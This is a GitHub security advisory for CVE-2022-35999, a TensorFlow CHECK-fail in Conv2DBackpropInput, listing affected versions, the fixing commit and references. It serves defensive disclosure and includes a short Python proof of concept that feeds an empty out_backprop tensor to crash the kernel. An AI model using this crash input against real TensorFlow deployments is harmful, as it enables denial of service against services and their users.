# [M] TensorFlow vulnerable to `CHECK` fail in `Conv2DBackpropInput`

## Summary
Severity: Medium
Advisory: GHSA-37jf-mjv6-xfqw
CVE: CVE-2022-35999
CWE: CWE-617
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2022-09-16
Source: https://github.com/advisories/GHSA-37jf-mjv6-xfqw
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=0 <2.7.2
- PyPI: `tensorflow` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow` — affected >=2.9.0 <2.9.1
- PyPI: `tensorflow-cpu` — affected >=0 <2.7.2
- PyPI: `tensorflow-cpu` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow-cpu` — affected >=2.9.0 <2.9.1
- PyPI: `tensorflow-gpu` — affected >=0 <2.7.2
- PyPI: `tensorflow-gpu` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow-gpu` — affected >=2.9.0 <2.9.1

## Details
### Impact
When `Conv2DBackpropInput` receives empty `out_backprop` inputs (e.g. `[3, 1, 0, 1]`), the current CPU/GPU kernels `CHECK` fail (one with dnnl, the other with cudnn). This can be used to trigger a denial of service attack.
```python
import tensorflow as tf
import numpy as np
input_sizes = [3, 1, 1, 2]
filter = np.ones([1, 3, 2, 3])
out_backprop = np.ones([3, 1, 0, 3])
strides = [1, 1, 2, 1]
padding = 'VALID'

tf.raw_ops.Conv2DBackpropInput(
   input_sizes = input_sizes,
   filter = filter,
   out_backprop = out_backprop,
   strides = strides,
   padding = padding
)
```

### Patches
We have patched the issue in GitHub commit [27a65a43cf763897fecfa5cdb5cc653fc5dd0346](https://github.com/tensorflow/tensorflow/commit/27a65a43cf763897fecfa5cdb5cc653fc5dd0346).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Jingyi Shi.

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-37jf-mjv6-xfqw
- https://nvd.nist.gov/vuln/detail/CVE-2022-35999
- https://github.com/tensorflow/tensorflow/commit/27a65a43cf763897fecfa5cdb5cc653fc5dd0346
- https://github.com/tensorflow/tensorflow
- https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0
